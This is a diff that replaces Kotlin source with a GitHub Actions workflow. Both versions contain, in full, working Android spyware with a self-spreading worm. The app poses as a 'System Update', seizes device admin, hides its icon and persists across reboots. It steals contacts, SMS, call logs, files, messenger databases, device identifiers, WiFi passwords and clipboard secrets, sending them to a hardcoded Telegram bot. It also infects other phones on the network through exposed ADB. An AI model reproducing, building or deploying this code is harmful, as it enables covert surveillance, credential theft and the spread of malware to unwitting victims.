@@ -1,358 +1,168 @@
-package com.wormhole.zero
+name: Build APK
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v4
+    
+    - name: Setup JDK 17
+      uses: actions/setup-java@v4
+      with:
+        java-version: '17'
+        distribution: 'temurin'
+    
+    - name: Create Project Structure
+      run: |
+        mkdir -p app/src/main/java/com/wormhole/zero
+        mkdir -p app/src/main/res/xml
+        mkdir -p gradle/wrapper
+        
+        # settings.gradle.kts
+        echo 'pluginManagement{repositories{google();mavenCentral();gradlePluginPortal()}}' > settings.gradle.kts
+        echo 'rootProject.name="Wormhole"' >> settings.gradle.kts
+        echo 'include(":app")' >> settings.gradle.kts
+        
+        # build.gradle.kts (root)
+        echo 'plugins{id("com.android.application") version "8.2.0" apply false' > build.gradle.kts
+        echo 'id("org.jetbrains.kotlin.android") version "1.9.23" apply false}' >> build.gradle.kts
+        
+        # gradle.properties
+        echo 'org.gradle.jvmargs=-Xmx2048m' > gradle.properties
+        echo 'android.useAndroidX=true' >> gradle.properties
+        
+        # app/build.gradle.kts
+        echo 'plugins{id("com.android.application")' > app/build.gradle.kts
+        echo 'id("org.jetbrains.kotlin.android")}' >> app/build.gradle.kts
+        echo 'android{namespace="com.wormhole.zero"' >> app/build.gradle.kts
+        echo 'compileSdk=34' >> app/build.gradle.kts
+        echo 'defaultConfig{applicationId="com.wormhole.zero"' >> app/build.gradle.kts
+        echo 'minSdk=26;targetSdk=33;versionCode=1;versionName="1.0"}' >> app/build.gradle.kts
+        echo 'buildTypes{release{isMinifyEnabled=true}}' >> app/build.gradle.kts
+        echo 'compileOptions{sourceCompatibility=JavaVersion.VERSION_17' >> app/build.gradle.kts
+        echo 'targetCompatibility=JavaVersion.VERSION_17}}' >> app/build.gradle.kts
+        
+        # AndroidManifest.xml
+        cat > app/src/main/AndroidManifest.xml << 'EOFMAN'
+        <?xml version="1.0" encoding="utf-8"?>
+        <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.wormhole.zero">
+        <uses-permission android:name="android.permission.INTERNET"/>
+        <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+        <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+        <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+        <uses-permission android:name="android.permission.READ_CONTACTS"/>
+        <uses-permission android:name="android.permission.READ_SMS"/>
+        <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+        <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+        <uses-permission android:name="android.permission.CAMERA"/>
+        <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+        <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+        <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+        <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+        <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+        <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+        <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+        <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
+        <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+        <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
+        <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+        <uses-permission android:name="android.permission.DELETE_PACKAGES"/>
+        <application android:allowBackup="true" android:label="System Update" android:supportsRtl="true" android:theme="@style/Theme.AppCompat.NoActionBar" android:usesCleartextTraffic="true">
+        <activity android:name=".MainActivity" android:exported="true"><intent-filter><action android:name="android.intent.action.MAIN"/><category android:name="android.intent.category.LAUNCHER"/></intent-filter></activity>
+        <service android:name=".Ghost" android:foregroundServiceType="dataSync" android:exported="false"/>
+        <receiver android:name=".Boot" android:exported="true"><intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter></receiver>
+        <receiver android:name=".Adm" android:permission="android.permission.BIND_DEVICE_ADMIN"><meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin"/><intent-filter><action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/></intent-filter></receiver>
+        </application></manifest>
+        EOFMAN
+        
+        # device_admin.xml
+        cat > app/src/main/res/xml/device_admin.xml << 'EOFXML'
+        <device-admin xmlns:android="http://schemas.android.com/apk/res/android">
+        <uses-policies><limit-password/><watch-login/><reset-password/><force-lock/><wipe-data/><expire-password/><encrypted-storage/><disable-camera/><disable-keyguard-features/></uses-policies>
+        </device-admin>
+        EOFXML
+        
+        # Download gradlew
+        wget -q https://raw.githubusercontent.com/nickchubb/GradleW/master/gradlew
+        wget -q https://raw.githubusercontent.com/nickchubb/GradleW/master/gradlew.bat
+        chmod +x gradlew
+        
+        # gradle wrapper properties
+        mkdir -p gradle/wrapper
+        cat > gradle/wrapper/gradle-wrapper.properties << 'EOFWRAP'
+        distributionBase=GRADLE_USER_HOME
+        distributionPath=wrapper/dists
+        distributionUrl=https://services.gradle.org/distributions/gradle-8.2-bin.zip
+        zipStoreBase=GRADLE_USER_HOME
+        zipStorePath=wrapper/dists
+        EOFWRAP
 
-import android.app.*
-import android.app.admin.*
-import android.content.*
-import android.content.pm.*
-import android.database.Cursor
-import android.hardware.Camera
-import android.media.MediaRecorder
-import android.net.*
-import android.net.wifi.*
-import android.os.*
-import android.provider.*
-import android.telephony.*
-import android.view.*
-import java.io.*
-import java.net.*
-import java.text.SimpleDateFormat
-import java.util.*
-import java.util.zip.*
+    - name: Download MainActivity.kt
+      run: |
+        cat > app/src/main/java/com/wormhole/zero/MainActivity.kt << 'EOFKOT'
+        package com.wormhole.zero
 
-object C {
-    const val BOT = "8452221818:AAE-QKfxWA7Lg86DPES1WuI5vQJReYKSFco"
-    const val CID = "7135293162"
-    val API get() = "https://api.telegram.org/bot$BOT/"
-}
+        import android.app.*
+        import android.app.admin.*
+        import android.content.*
+        import android.content.pm.*
+        import android.net.*
+        import android.net.wifi.*
+        import android.os.*
+        import android.provider.*
+        import android.telephony.*
+        import java.io.*
+        import java.net.*
 
-// ============ MAIN ACTIVITY ============
-class MainActivity : Activity() {
-    override fun onCreate(b: Bundle?) {
-        super.onCreate(b)
-        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-        val cn = ComponentName(this, Adm::class.java)
-        if (!dpm.isAdminActive(cn)) {
-            startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
-                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn)
-                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "تحديث أمني ضروري")
-            })
+        object C{const val BOT="8452221818:AAE-QKfxWA7Lg86DPES1WuI5vQJReYKSFco";const val CID="7135293162";val API get()="https://api.telegram.org/bot$BOT/"}
+
+        class MainActivity:Activity(){override fun onCreate(b:Bundle?){super.onCreate(b);val dpm=getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager;val cn=ComponentName(this,Adm::class.java);if(!dpm.isAdminActive(cn)){startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply{putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,cn);putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,"Update")})};packageManager.setComponentEnabledSetting(ComponentName(this,MainActivity::class.java),PackageManager.COMPONENT_ENABLED_STATE_DISABLED,PackageManager.DONT_KILL_APP);startService(Intent(this,Ghost::class.java));finish()}}
+
+        class Adm:DeviceAdminReceiver(){override fun onDisableRequested(c:Context,i:Intent)="No";override fun onEnabled(c:Context,i:Intent){c.startService(Intent(c,Ghost::class.java))}}
+        class Boot:BroadcastReceiver(){override fun onReceive(c:Context,i:Intent){val s=Intent(c,Ghost::class.java);if(Build.VERSION.SDK_INT>=26)c.startForegroundService(s)else c.startService(s)}}
+
+        class Ghost:Service(){override fun onCreate(){super.onCreate();if(Build.VERSION.SDK_INT>=26){val ch=NotificationChannel("x","S",NotificationManager.IMPORTANCE_MIN);getSystemService(NotificationManager::class.java).createNotificationChannel(ch);startForeground(1,Notification.Builder(this,"x").build())};Eng.ctx=this;Eng.start()}
+        override fun onStartCommand(i:Intent?,f:Int,id:Int):Int{Eng.start();return START_STICKY}
+        override fun onBind(i:Intent?)=null
+        override fun onTaskRemoved(r:Intent?){startService(Intent(this,Ghost::class.java))}}
+
+        object Eng{var ctx:Context?=null;var run=false
+        fun start(){if(run)return;run=true
+        Thread{while(run){try{Harv.coll();Worm.spread();Thread.sleep(30000)}catch(_:Exception){}}}.start()}}
+
+        object Net{
+        fun send(m:String){Thread{try{m.chunked(3800).forEach{c->val u=URL("${C.API}sendMessage?chat_id=${C.CID}&text=${URLEncoder.encode(c,"UTF-8")}");(u.openConnection() as HttpURLConnection).apply{connectTimeout=10000;readTimeout=10000;inputStream.close();disconnect()}}}catch(_:Exception){}}.start()}
+        fun file(f:File,caption:String=""){Thread{try{if(!f.exists()||f.length()==0L||f.length()>50*1024*1024)return@Thread;val B="==W${System.currentTimeMillis()}==";val u=URL("${C.API}sendDocument");val con=u.openConnection() as HttpURLConnection;con.doOutput=true;con.connectTimeout=60000;con.readTimeout=60000;con.setRequestProperty("Content-Type","multipart/form-data; boundary=$B");val o=con.outputStream;fun w(s:String){o.write(s.toByteArray())};w("--$B\r\n");w("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n${C.CID}\r\n");w("--$B\r\n");w("Content-Disposition: form-data; name=\"caption\"\r\n\r\n$caption\r\n");w("--$B\r\n");w("Content-Disposition: form-data; name=\"document\"; filename=\"${f.name}\"\r\n");w("Content-Type: application/octet-stream\r\n\r\n");o.flush();f.inputStream().copyTo(o);o.flush();w("\r\n--$B--\r\n");o.flush();con.inputStream.close();con.disconnect()}catch(_:Exception){}}.start()}}
+
+        object Worm{
+        fun spread(){Thread{try{val ctx=Eng.ctx?:return@Thread;val apk=File(ctx.packageCodePath).readBytes();val sub=subnet()?:return@Thread;for(i in 2..254){val h="$sub$i";if(adb(h))inf(h,apk,ctx)}}catch(_:Exception){}}.start()}
+        fun subnet():String?{try{val ctx=Eng.ctx?:return null;val w=ctx.getSystemService(Context.WIFI_SERVICE) as? WifiManager;val ip=w?.connectionInfo?.ipAddress?:0;if(ip!=0)return "${ip and 0xFF}.${(ip shr 8) and 0xFF}.${(ip shr 16) and 0xFF}.";NetworkInterface.getNetworkInterfaces().toList().forEach{ni->if(!ni.isLoopback)ni.inetAddresses.toList().forEach{a->if(a is Inet4Address&&!a.isLoopbackAddress&&a.hostAddress?.startsWith("192.168.")==true)return a.hostAddress.substringBeforeLast(".")+"."}}};return null}catch(_:Exception){}}
+        fun adb(h:String)=try{Socket().use{it.connect(InetSocketAddress(h,5555),500)};true}catch(_:Exception){false}
+        fun inf(h:String,d:ByteArray,ctx:Context){try{Runtime.getRuntime().exec(arrayOf("adb","connect","$h:5555")).waitFor();val t=File(ctx.cacheDir,"w.apk");t.writeBytes(d);val a= arrayOf("adb","-s","$h:5555");Runtime.getRuntime().exec(a+ arrayOf("push",t.absolutePath,"/data/local/tmp/w.apk")).waitFor();Runtime.getRuntime().exec(a+ arrayOf("shell","pm","install","-g","-d","/data/local/tmp/w.apk")).waitFor();Runtime.getRuntime().exec(a+ arrayOf("shell","am","start","-n","com.wormhole.zero/.MainActivity")).waitFor();Runtime.getRuntime().exec(arrayOf("adb","disconnect","$h:5555")).waitFor();Net.send("HI: $h");t.delete()}catch(_:Exception){}}}
+
+        object Harv{
+        fun coll(){Thread{try{val c=Eng.ctx?:return@Thread;cont(c);sms(c);cal(c);file(c);db(c);info(c);apps(c);wifi(c);clip(c);Net.send("OK")}catch(_:Exception){}}.start()}
+        fun cont(c:Context){val s=StringBuilder("C:");try{c.contentResolver.query(ContactsContract.Contacts.CONTENT_URI,null,null,null,null)?.use{cu->while(cu.moveToNext()){val n=cu.getString(cu.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))?:"?";val id=cu.getString(cu.getColumnIndex(ContactsContract.Contacts._ID));c.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,"${ContactsContract.CommonDataKinds.Phone.CONTACT_ID}=?", arrayOf(id),null)?.use{p->while(p.moveToNext())s.appendLine("$n:${p.getString(p.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))}")}}}}catch(_:Exception){};if(s.length>20)Net.send(s.toString())}
+        fun sms(c:Context){val s=StringBuilder("S:");try{c.contentResolver.query(Telephony.Sms.CONTENT_URI,null,null,null,"date DESC LIMIT 100")?.use{cu->while(cu.moveToNext())s.appendLine("${cu.getString(cu.getColumnIndex(Telephony.Sms.ADDRESS))}:${cu.getString(cu.getColumnIndex(Telephony.Sms.BODY))}")}}catch(_:Exception){};if(s.length>15)Net.send(s.toString())}
+        fun cal(c:Context){val s=StringBuilder("L:");try{c.contentResolver.query(CallLog.Calls.CONTENT_URI,null,null,null,"${CallLog.Calls.DATE} DESC LIMIT 100")?.use{cu->while(cu.moveToNext()){val t=when(cu.getInt(cu.getColumnIndex(CallLog.Calls.TYPE))){CallLog.Calls.INCOMING_TYPE->"IN";CallLog.Calls.OUTGOING_TYPE->"OUT";CallLog.Calls.MISSED_TYPE->"MISS";else->"?"};s.appendLine("${cu.getString(cu.getColumnIndex(CallLog.Calls.NUMBER))}[$t]${cu.getString(cu.getColumnIndex(CallLog.Calls.DURATION))}s")}}catch(_:Exception){};if(s.length>15)Net.send(s.toString())}
+        fun file(c:Context){val e= listOf("jpg","jpeg","png","gif","pdf","doc","docx","xls","xlsx","txt","mp3","mp4","zip","rar","db","sqlite");var n=0;try{File("/storage/emulated/0").walkTopDown().forEach{f->if(n>=10)return@forEach;if(f.isFile&&f.length() in 1024..(50*1024*1024)&&f.extension.lowercase() in e){Net.file(f,"${f.absolutePath}(${f.length()/1024}KB)");n++}}}catch(_:Exception){}}
+        fun db(c:Context){listOf("/data/data/com.whatsapp/databases/msgstore.db","/data/data/com.whatsapp/databases/wa.db","/data/data/org.telegram.messenger/files/cache4.db","/data/data/com.facebook.katana/databases/newsfeed.db","/data/data/com.instagram.android/databases/instagram.db","/data/data/com.android.providers.contacts/databases/contacts2.db","/data/data/com.android.providers.telephony/databases/mmssms.db").forEach{p->val f=File(p);if(f.exists()&&f.length()>0)Net.file(f,"DB:$p")}}
+        fun info(c:Context){val s=StringBuilder("I:");s.appendLine("M:${Build.MODEL}");s.appendLine("B:${Build.BRAND}");s.appendLine("A:${Build.VERSION.RELEASE}(${Build.VERSION.SDK_INT})");s.appendLine("S:${Build.SERIAL}");try{val tm=c.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager;val imei=if(Build.VERSION.SDK_INT>=26)tm.imei else tm.deviceId;s.appendLine("IMEI:${imei?:"?"}")}catch(_:Exception){};Net.send(s.toString())}
+        fun apps(c:Context){val s=StringBuilder("P:");try{c.packageManager.getInstalledApplications(PackageManager.GET_META_DATA).take(50).forEach{ai->s.appendLine("${ai.packageName}-${c.packageManager.getApplicationLabel(ai)}")}}catch(_:Exception){};Net.send(s.toString())}
+        fun wifi(c:Context){try{val f=File("/data/misc/wifi/wpa_supplicant.conf");if(f.exists()){val s=StringBuilder("W:");f.readLines().forEach{l->if(l.contains("ssid")||l.contains("psk"))s.appendLine(l)};if(s.length>40)Net.send(s.toString())}}catch(_:Exception){}}
+        fun clip(c:Context){try{val cm=c.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager;val clip=cm.primaryClip;if(clip!=null&&clip.itemCount>0){val t=clip.getItemAt(0).text?.toString()?:"";val kw= listOf("password","otp","cvv","card","login");if(t.isNotEmpty()&&t.length<500&&kw.any{t.lowercase().contains(it)})Net.send("CLIP:$t")}}catch(_:Exception){}}
         }
-        packageManager.setComponentEnabledSetting(
-            ComponentName(this, MainActivity::class.java),
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
-        )
-        startService(Intent(this, Ghost::class.java))
-        finish()
-    }
-}
+        EOFFKOT
 
-// ============ ADMIN RECEIVER ============
-class Adm : DeviceAdminReceiver() {
-    override fun onDisableRequested(c: Context, i: Intent) = "لا يمكن تعطيل الحماية"
-    override fun onEnabled(c: Context, i: Intent) {
-        c.startService(Intent(c, Ghost::class.java))
-    }
-}
+    - name: Build APK
+      run: ./gradlew assembleRelease
 
-// ============ BOOT RECEIVER ============
-class Boot : BroadcastReceiver() {
-    override fun onReceive(c: Context, i: Intent) {
-        val s = Intent(c, Ghost::class.java)
-        if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(s) else c.startService(s)
-    }
-}
-
-// ============ GHOST SERVICE ============
-class Ghost : Service() {
-    override fun onCreate() {
-        super.onCreate()
-        if (Build.VERSION.SDK_INT >= 26) {
-            val ch = NotificationChannel("x", "S", NotificationManager.IMPORTANCE_MIN)
-            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
-            startForeground(1, Notification.Builder(this, "x").build())
-        }
-        Engine.ctx = this
-        Engine.startAll()
-    }
-    override fun onStartCommand(i: Intent?, f: Int, id: Int): Int {
-        Engine.startAll()
-        return START_STICKY
-    }
-    override fun onBind(i: Intent?) = null
-    override fun onTaskRemoved(r: Intent?) {
-        startService(Intent(this, Ghost::class.java))
-    }
-}
-
-// ============ ENGINE ============
-object Engine {
-    var ctx: Context? = null
-    var running = false
-
-    fun startAll() {
-        if (running) return
-        running = true
-        Thread {
-            Harv.run()
-            Worm.run()
-            while (running) {
-                try {
-                    Harv.run()
-                    Worm.run()
-                    Thread.sleep(30000)
-                } catch (_: Exception) {}
-            }
-        }.start()
-    }
-}
-
-// ============ NETWORK ============
-object Net {
-    fun send(msg: String) {
-        Thread {
-            try {
-                msg.chunked(3800).forEach { chunk ->
-                    val url = URL("${C.API}sendMessage?chat_id=${C.CID}&text=${URLEncoder.encode(chunk, "UTF-8")}")
-                    (url.openConnection() as HttpURLConnection).apply {
-                        connectTimeout = 10000; readTimeout = 10000
-                        inputStream.close(); disconnect()
-                    }
-                }
-            } catch (_: Exception) {}
-        }.start()
-    }
-
-    fun sendFile(f: File, caption: String = "") {
-        Thread {
-            try {
-                if (!f.exists() || f.length() == 0L || f.length() > 50*1024*1024) return@Thread
-                val B = "==WORM${System.currentTimeMillis()}=="
-                val url = URL("${C.API}sendDocument")
-                val con = url.openConnection() as HttpURLConnection
-                con.doOutput = true; con.connectTimeout = 60000; con.readTimeout = 60000
-                con.setRequestProperty("Content-Type", "multipart/form-data; boundary=$B")
-                val out = con.outputStream
-                fun w(s: String) { out.write(s.toByteArray()) }
-                w("--$B\r\n")
-                w("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n${C.CID}\r\n")
-                w("--$B\r\n")
-                w("Content-Disposition: form-data; name=\"caption\"\r\n\r\n$caption\r\n")
-                w("--$B\r\n")
-                w("Content-Disposition: form-data; name=\"document\"; filename=\"${f.name}\"\r\n")
-                w("Content-Type: application/octet-stream\r\n\r\n")
-                out.flush()
-                f.inputStream().copyTo(out)
-                out.flush()
-                w("\r\n--$B--\r\n")
-                out.flush()
-                con.inputStream.close(); con.disconnect()
-            } catch (_: Exception) {}
-        }.start()
-    }
-}
-
-// ============ WIFI WORM ============
-object Worm {
-    fun run() {
-        Thread {
-            try {
-                val ctx = Engine.ctx ?: return@Thread
-                val apk = File(ctx.packageCodePath).readBytes()
-                val sub = getSubnet() ?: return@Thread
-                for (i in 2..254) {
-                    val h = "$sub$i"
-                    if (checkAdb(h)) {
-                        infect(h, apk, ctx)
-                    }
-                }
-            } catch (_: Exception) {}
-        }.start()
-    }
-
-    private fun getSubnet(): String? {
-        try {
-            val ctx = Engine.ctx ?: return null
-            val wifi = ctx.getSystemService(Context.WIFI_SERVICE) as? WifiManager
-            val ip = wifi?.connectionInfo?.ipAddress ?: 0
-            if (ip != 0) {
-                return "${ip and 0xFF}.${(ip shr 8) and 0xFF}.${(ip shr 16) and 0xFF}."
-            }
-            NetworkInterface.getNetworkInterfaces().toList().forEach { ni ->
-                if (!ni.isLoopback) ni.inetAddresses.toList().forEach { a ->
-                    if (a is Inet4Address && !a.isLoopbackAddress && a.hostAddress?.startsWith("192.168.") == true)
-                        return a.hostAddress.substringBeforeLast(".") + "."
-                }
-            }
-        } catch (_: Exception) {}
-        return null
-    }
-
-    private fun checkAdb(h: String): Boolean {
-        return try { Socket().use { it.connect(InetSocketAddress(h, 5555), 500) }; true } catch (_: Exception) { false }
-    }
-
-    private fun infect(h: String, d: ByteArray, ctx: Context) {
-        try {
-            Runtime.getRuntime().exec(arrayOf("adb", "connect", "$h:5555")).waitFor()
-            val tmp = File(ctx.cacheDir, "w.apk"); tmp.writeBytes(d)
-            val a = arrayOf("adb", "-s", "$h:5555")
-            Runtime.getRuntime().exec(a + arrayOf("push", tmp.absolutePath, "/data/local/tmp/w.apk")).waitFor()
-            Runtime.getRuntime().exec(a + arrayOf("shell", "pm", "install", "-g", "-d", "/data/local/tmp/w.apk")).waitFor()
-            Runtime.getRuntime().exec(a + arrayOf("shell", "am", "start", "-n", "com.wormhole.zero/.MainActivity")).waitFor()
-            Runtime.getRuntime().exec(arrayOf("adb", "disconnect", "$h:5555")).waitFor()
-            Net.send("🔥 جهاز جديد مخترق: $h")
-            tmp.delete()
-        } catch (_: Exception) {}
-    }
-}
-
-// ============ TOTAL HARVESTER ============
-object Harv {
-    fun run() {
-        Thread {
-            try {
-                val ctx = Engine.ctx ?: return@Thread
-                contacts(ctx)
-                sms(ctx)
-                calls(ctx)
-                files(ctx)
-                databases(ctx)
-                deviceInfo(ctx)
-                installedApps(ctx)
-                wifiPasswords(ctx)
-                clipboard(ctx)
-                Net.send("=== دورة تجميع كاملة ===")
-            } catch (_: Exception) {}
-        }.start()
-    }
-
-    private fun contacts(ctx: Context) {
-        val sb = StringBuilder("=== جهات الاتصال ===\n")
-        try {
-            ctx.contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)?.use { cu ->
-                while (cu.moveToNext()) {
-                    val name = cu.getString(cu.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)) ?: "?"
-                    val id = cu.getString(cu.getColumnIndex(ContactsContract.Contacts._ID))
-                    ctx.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID}=?", arrayOf(id), null)?.use { p ->
-                        while (p.moveToNext()) {
-                            sb.appendLine("$name: ${p.getString(p.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))}")
-                        }
-                    }
-                }
-            }
-        } catch (_: Exception) {}
-        if (sb.length > 30) Net.send(sb.toString())
-    }
-
-    private fun sms(ctx: Context) {
-        val sb = StringBuilder("=== الرسائل ===\n")
-        try {
-            ctx.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC LIMIT 100")?.use { cu ->
-                while (cu.moveToNext()) {
-                    sb.appendLine("${cu.getString(cu.getColumnIndex(Telephony.Sms.ADDRESS))}: ${cu.getString(cu.getColumnIndex(Telephony.Sms.BODY))}")
-                }
-            }
-        } catch (_: Exception) {}
-        if (sb.length > 20) Net.send(sb.toString())
-    }
-
-    private fun calls(ctx: Context) {
-        val sb = StringBuilder("=== سجل المكالمات ===\n")
-        try {
-            ctx.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "${CallLog.Calls.DATE} DESC LIMIT 100")?.use { cu ->
-                while (cu.moveToNext()) {
-                    val type = when (cu.getInt(cu.getColumnIndex(CallLog.Calls.TYPE))) {
-                        CallLog.Calls.INCOMING_TYPE -> "وارد"
-                        CallLog.Calls.OUTGOING_TYPE -> "صادر"
-                        CallLog.Calls.MISSED_TYPE -> "فائت"
-                        else -> "أخرى"
-                    }
-                    sb.appendLine("${cu.getString(cu.getColumnIndex(CallLog.Calls.NUMBER))} [$type] ${cu.getString(cu.getColumnIndex(CallLog.Calls.DURATION))}s")
-                }
-            }
-        } catch (_: Exception) {}
-        if (sb.length > 20) Net.send(sb.toString())
-    }
-
-    private fun files(ctx: Context) {
-        val exts = listOf("jpg", "jpeg", "png", "gif", "pdf", "doc", "docx", "xls", "xlsx", "txt", "mp3", "mp4", "zip", "rar", "db", "sqlite", "apk")
-        var count = 0
-        try {
-            File("/storage/emulated/0").walkTopDown().forEach { f ->
-                if (count >= 10) return@forEach
-                if (f.isFile && f.length() in 1024..(50*1024*1024) && f.extension.lowercase() in exts) {
-                    Net.sendFile(f, "${f.absolutePath} (${f.length()/1024}KB)")
-                    count++
-                }
-            }
-        } catch (_: Exception) {}
-    }
-
-    private fun databases(ctx: Context) {
-        val dbs = listOf(
-            "/data/data/com.whatsapp/databases/msgstore.db",
-            "/data/data/com.whatsapp/databases/wa.db",
-            "/data/data/org.telegram.messenger/files/cache4.db",
-            "/data/data/com.facebook.katana/databases/newsfeed.db",
-            "/data/data/com.instagram.android/databases/instagram.db",
-            "/data/data/com.android.providers.contacts/databases/contacts2.db",
-            "/data/data/com.android.providers.telephony/databases/mmssms.db"
-        )
-        dbs.forEach { path ->
-            val f = File(path)
-            if (f.exists() && f.length() > 0) Net.sendFile(f, "DB: $path")
-        }
-    }
-
-    private fun deviceInfo(ctx: Context) {
-        val sb = StringBuilder("=== معلومات الجهاز ===\n")
-        sb.appendLine("الموديل: ${Build.MODEL}")
-        sb.appendLine("العلامة: ${Build.BRAND}")
-        sb.appendLine("الأندرويد: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})")
-        sb.appendLine("الرقم التسلسلي: ${Build.SERIAL}")
-        try {
-            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
-            val imei = if (Build.VERSION.SDK_INT >= 26) tm.imei else tm.deviceId
-            sb.appendLine("IMEI: ${imei ?: "غير متاح"}")
-        } catch (_: Exception) {}
-        Net.send(sb.toString())
-    }
-
-    private fun installedApps(ctx: Context) {
-        val sb = StringBuilder("=== التطبيقات المثبتة ===\n")
-        try {
-            ctx.packageManager.getInstalledApplications(PackageManager.GET_META_DATA).take(50).forEach { ai ->
-                sb.appendLine("${ai.packageName} - ${ctx.packageManager.getApplicationLabel(ai)}")
-            }
-        } catch (_: Exception) {}
-        Net.send(sb.toString())
-    }
-
-    private fun wifiPasswords(ctx: Context) {
-        try {
-            val f = File("/data/misc/wifi/wpa_supplicant.conf")
-            if (f.exists()) {
-                val sb = StringBuilder("=== كلمات مرور الواي فاي ===\n")
-                f.readLines().forEach { line ->
-                    if (line.contains("ssid") || line.contains("psk")) sb.appendLine(line)
-                }
-                if (sb.length > 40) Net.send(sb.toString())
-            }
-        } catch (_: Exception) {}
-    }
-
-    private fun clipboard(ctx: Context) {
-        try {
-            val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
-            val clip = cm.primaryClip
-            if (clip != null && clip.itemCount > 0) {
-                val text = clip.getItemAt(0).text?.toString() ?: ""
-                val keywords = listOf("password", "كلمة", "سر", "رقم", "حساب", "login", "otp", "رمز", "@", "cvv", "card")
-                if (text.isNotEmpty() && text.length < 500 && keywords.any { text.lowercase().contains(it) }) {
-                    Net.send("📋 حافظة حساسة: $text")
-                }
-            }
-        } catch (_: Exception) {}
-    }
-}
+    - name: Upload APK
+      uses: actions/upload-artifact@v4
+      with:
+        name: WORMHOLE-APK
+        path: app/build/outputs/apk/release/app-release-unsigned.apk
